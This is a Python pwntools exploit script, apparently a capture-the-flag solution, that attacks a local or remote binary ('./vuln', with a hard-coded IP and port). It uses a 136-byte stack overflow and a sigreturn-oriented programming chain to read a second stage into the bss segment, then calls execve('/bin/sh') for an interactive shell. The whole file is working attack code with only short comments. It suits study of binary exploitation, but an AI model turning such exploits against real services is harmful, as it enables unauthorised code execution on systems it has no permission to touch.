#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

def start():
    if not args.REMOTE:
        return process('./vuln')
    else:
        return remote('146.148.108.204', 4444)

p = start()
if args.GDB:
    gdb.attach(p)

p.recv()

# Important addresses
pop_rax = 0x401032 # pop rax; syscall
syscall = 0x401033 # syscall; leave; ret
rw = 0x402040 # read-write section

payload = 'A'*136 # overflow to return address
payload += p64(pop_rax) # pop rax; syscall
payload += p64(0xf) # make syscall number 15 for rt_sigreturn

# Sigreturn frame
frame = SigreturnFrame()
frame.rax = 0 # Read syscall
frame.rsp = rw+8 # move the stack pointer to the bss segment
frame.rbp = rw+0x60 # Move the base pointerr to the bss segment
frame.rdi = 0 # Read from stdin
frame.rsi = rw # Read into the read-write section
frame.rdx = 0x400 # Read 0x400 bytes
frame.rip = syscall # jumps to the syscall; leave; ret gadget after syscall

payload += str(frame)

p.sendline(payload)

# Sleep to let the payload send (needed for remote)
sleep(1)

# Now we start our new payload in the bss segment
# ------------------------------------
payload = '/bin/sh\x00' # Input /bin/sh\x00 to use later
payload += 'A'*96 # Overwrite until return address in our "emulated" stack
payload += p64(pop_rax) # Jump to pop rax; syscall
payload += p64(0xf) # Make syscall number 15 for rt_sigreturn

# Call execve now
frame = SigreturnFrame()
frame.rax = 59 # execve
frame.rdi = rw # addr of /bin/sh\x00
frame.rsi = 0 # needs to be null
frame.rdx = 0 # needs to be null
frame.rip = syscall # Jump to syscall;

payload += str(frame)

p.sendline(payload)

p.interactive()
